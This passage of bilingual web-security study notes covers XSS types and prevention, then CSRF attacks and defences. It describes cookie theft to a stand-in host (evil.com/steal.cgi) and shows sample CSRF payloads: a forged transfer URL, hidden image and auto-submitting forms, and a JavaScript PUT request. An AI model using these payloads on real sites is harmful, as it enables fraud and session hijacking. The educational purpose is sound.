&lt;p&gt;由于未对输入进行过滤，浏览器将  &lt;code&gt;script&lt;/code&gt;  标签作为普通的 JavaScript 代码执行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结果
&lt;ul&gt;
&lt;li&gt;浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  &lt;code&gt;evil.com/steal.cgi&lt;/code&gt;  发送了用户的  &lt;code&gt;cookie&lt;/code&gt;  信息。&lt;/li&gt;
&lt;li&gt;攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。&lt;/li&gt;
&lt;li&gt;违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Reflected XSS Attack Details&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;User is tricked into visiting an honest website&lt;/li&gt;
&lt;li&gt;Bug in website code causes user’s browser to execute an arbitrary attack script
&lt;ul&gt;
&lt;li&gt;The origin of this script is now the website itself&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Script can request sensitive data, control form fields on this page and linked pages
&lt;ul&gt;
&lt;li&gt;Can cause user’s browser to attack other websites&lt;br&gt;
Example: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL015U3BhY2UuY29t&#34;&gt;MySpace.com&lt;/span&gt; phishing attack injects a fake password field that sends password to attacker&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Stored XSS VS Reflected XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored XSS VS Reflected XSS&#34;&gt;#&lt;/a&gt;Stored XSS VS Reflected XSS&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;存储型 XSS (Stored XSS)&lt;/th&gt;
&lt;th&gt;反射型 XSS (Reflected XSS)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;代码存储&lt;/td&gt;
&lt;td&gt;服务器端持久存储&lt;/td&gt;
&lt;td&gt;仅在请求中反射&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;持久性&lt;/td&gt;
&lt;td&gt;持久性，影响更多用户&lt;/td&gt;
&lt;td&gt;非持久性，通常只影响特定用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;攻击手段&lt;/td&gt;
&lt;td&gt;利用持久存储（如数据库、日志、文件等）&lt;/td&gt;
&lt;td&gt;通过恶意链接或表单提交诱导用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;示例场景&lt;/td&gt;
&lt;td&gt;评论区、论坛帖子、博客文章、用户简介等&lt;/td&gt;
&lt;td&gt;钓鱼邮件、恶意链接、搜索查询等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;修复难度&lt;/td&gt;
&lt;td&gt;难度较大，需清理服务器上的恶意代码&lt;/td&gt;
&lt;td&gt;难度较小，可通过输入验证和转义快速修复&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;Preventing XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Preventing XSS Attacks&#34;&gt;#&lt;/a&gt;Preventing XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Input Filtering&lt;br&gt;
 还没懂先放个链接在这&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==&#34;&gt; XSS Filter Evasion Cheat Sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Framework validation&lt;/li&gt;
&lt;li&gt;Output Sanitisation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Any user input and client-side data must be preprocessed before it is used inside HTML
&lt;ul&gt;
&lt;li&gt;PHP:  &lt;code&gt;htmlspecialchars(string)&lt;/code&gt;  replaces all special characters with their HTML code 例如，将  &lt;code&gt;&amp;lt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;lt;&lt;/code&gt; ， &lt;code&gt;&amp;gt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;gt;&lt;/code&gt; ，以防止这些字符被浏览器解释为 HTML 或脚本标签。&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FTUC5ORVQ=&#34;&gt;ASP.NET&lt;/span&gt;:  &lt;code&gt;Server.HtmlEncode(string)&lt;/code&gt;  该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;过滤可能会将输入转换成攻击形式
&lt;ul&gt;
&lt;li&gt;如果预处理过程中未彻底消除所有潜在威胁，有可能仍会导致 XSS 等攻击。&lt;/li&gt;
&lt;li&gt;需要在过滤后多次循环检查，并在检测到恶意内容时重新应用过滤，直到不再发现潜在威胁为止。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Cross-Site Request Forgery&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Request Forgery&#34;&gt;#&lt;/a&gt;Cross-Site Request Forgery&lt;/h1&gt;
&lt;h2 id=&#34;CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#CSRF&#34;&gt;#&lt;/a&gt;CSRF&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Cross-Site Request Forgery (CSRF)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A privileged user is tricked to perform an operation on the behalf of an attacker
&lt;ul&gt;
&lt;li&gt;Often through social engineering (such as sending a link via email or chat)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Usually unnoticed by the victim user
&lt;ul&gt;
&lt;li&gt;Requests are sent by the browser behind the scenes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSRF exploits the trust that a web site has in a user’s browser
&lt;ul&gt;
&lt;li&gt;XSS exploits the trust a user has for a particular site&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Characteristics of CSRF&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Web sites rely on a user’s identity&lt;/li&gt;
&lt;li&gt;The site has trust in that identity&lt;/li&gt;
&lt;li&gt;The user’s browser is tricked into sending HTTP requests to a target site&lt;/li&gt;
&lt;li&gt;Such HTTP requests have side effects
&lt;ul&gt;
&lt;li&gt;Because the attacker doesn’t receive the response&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Example&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Example&#34;&gt;#&lt;/a&gt;Example&lt;/h2&gt;
Example Description：
Alice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: 
&lt;ul&gt;
&lt;li&gt;Build an exploit URL or script&lt;/li&gt;
&lt;li&gt;Trick Alice into executing the action with social engineering&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Example: GET&lt;br&gt;
A GET request from Alice to transfer money to Bob&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;BOB&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Charlie first forges the following exploit URL&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;CHARLIE&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Then, Charlie tricks Alice into loading this URL &lt;strong&gt;when Alice is logged into the bank&lt;/strong&gt; 例如通过发送恶意电子邮件或在其他网站上种植恶意链接。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;查看我的图片！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;width&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;height&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Example: POST&lt;br&gt;
A POST request from Alice to transfer money to Bob&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; acct=BOB&amp;amp;amount=100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Charlie first crafts some hidden FORM tags&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;100000&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;查看我的图片！&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Then, Charlie tricks Alice to click on the submit button&lt;br&gt;
Can also be executed automatically using JavaScript&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;document.forms[0].submit()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example: Other HTTP Methods&lt;br&gt;
Charlie can use HTTP PUT method that takes a JSON object as an argument&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;acct&amp;quot;: &amp;quot;CHARLIE&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;amount&amp;quot;: 100000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Such requests can be executed with JavaScript&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;put&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; x = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;XMLHttpRequest&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;PUT&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;send&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;JSON&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;stringify&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&amp;#125;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Prevention CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Prevention CSRF&#34;&gt;#&lt;/a&gt;Prevention CSRF&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Prevention Methods That Do Not Work
&lt;ol&gt;
&lt;li&gt;使用 “秘密” Cookie  (Using a secret cookie) ：在请求中加入一个 “秘密” Cookie，用来验证请求的合法性。&lt;br&gt;
所有 Cookie 都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些 Cookie。&lt;/li&gt;
&lt;li&gt;仅接受 POST 请求 (Only accepting POST requests) ：限制仅接受 POST 请求来提交敏感操作的数据。&lt;br&gt;
攻击者仍然可以通过 HTML 表单、AJAX 请求或自动提交脚本，诱导受害者提交伪造的 POST 请求。因此，仅使用 POST 请求并不能完全防止 CSRF。&lt;/li&gt;
&lt;li&gt;多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：&lt;br&gt;
攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如 CSRF 令牌），多步流程仍然易受 CSRF 攻击。&lt;/li&gt;
&lt;li&gt;URL 重写 (URL Rewriting)： 在 URL 中包含用户的会话 ID 以维护状态。&lt;br&gt;
将会话 ID 暴露在 URL 中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话 ID。&lt;/li&gt;
&lt;li&gt;HTTPS：使用 HTTPS 来加密通信内容。&lt;br&gt;
HTTPS 只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的 CSRF 攻击请求，哪怕是 HTTPS 加密的请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Prevent CSRF: Token-based mitigation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A CSRF token is a unique, secret, unpredictable value
&lt;ul&gt;
&lt;li&gt;Generated by web applications and included on their own web pages&lt;br&gt;
 &lt;code&gt;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;amp;token=31415926535&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web applications reject requests if the token is missing or invalid
&lt;ul&gt;
&lt;li&gt;Impossible for an attacker to guess the token and construct a fully valid HTTP request&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Types of CSRF tokens
&lt;ul&gt;
&lt;li&gt;Synchroniser token 同步令牌：
&lt;ul&gt;
&lt;li&gt;服务端为每个会话生成一个唯一的令牌，并在请求中验证该令牌。&lt;/li&gt;
&lt;li&gt;典型的做法是在表单中嵌入一个隐藏字段，或在 URL 中附加该令牌。&lt;/li&gt;
&lt;li&gt;缺点是需要在服务端保存和管理令牌。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;encryption-based token 加密令牌：
&lt;ul&gt;
&lt;li&gt;使用加密算法将用户信息和时间戳加密，生成唯一的令牌。&lt;/li&gt;
&lt;li&gt;这种令牌不需要服务端存储，因为它可以通过解密来验证请求的有效性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hash-based token 哈希令牌：
&lt;ul&gt;
&lt;li&gt;使用用户会话信息、请求参数等作为输入，生成一个哈希值作为令牌。&lt;/li&gt;
&lt;li&gt;通常通过加盐（salt）来增加令牌的复杂性和不可预测性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Prevent CSRF: Defence-in-depth techniques&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SameSite Cookie Attribute
&lt;ul&gt;
&lt;li&gt;Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts&lt;/li&gt;
&lt;li&gt;如何防护：设置 &lt;code&gt;SameSite&lt;/code&gt;  属性为 &lt;code&gt;Strict&lt;/code&gt;  或 &lt;code&gt;Lax&lt;/code&gt; ，防止浏览器在跨站浏览环境中发送 Cookie，从而阻止 CSRF 攻击。&lt;br&gt;
 &lt;code&gt;SameSite=Strict&lt;/code&gt; ：Cookie 仅在同一站点请求时发送，完全阻止跨站请求。&lt;br&gt;
 &lt;code&gt;SameSite=Lax&lt;/code&gt; ：Cookie 允许在少数跨站请求中发送（如 GET 请求或导航），但会限制大多数情况下的跨站请求&lt;/li&gt;
